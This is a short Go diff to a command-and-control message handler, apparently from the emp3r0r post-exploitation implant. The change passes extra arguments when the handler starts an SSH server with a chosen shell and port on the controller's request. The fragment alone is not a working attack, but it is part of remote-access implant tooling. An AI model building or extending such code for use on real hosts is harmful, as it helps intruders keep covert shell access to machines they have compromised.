@@ -292,8 +292,9 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			log.Printf("Got sshd request: %s", cmdSlice)
 			shell := cmdSlice[1]
 			port := cmdSlice[2]
+			args := cmdSlice[3 : len(cmdSlice)-1]
 			go func() {
-				err = SSHD(shell, port)
+				err = SSHD(shell, port, args)
 				if err != nil {
 					log.Printf("Failed to start SSHD: %v", err)
 				}
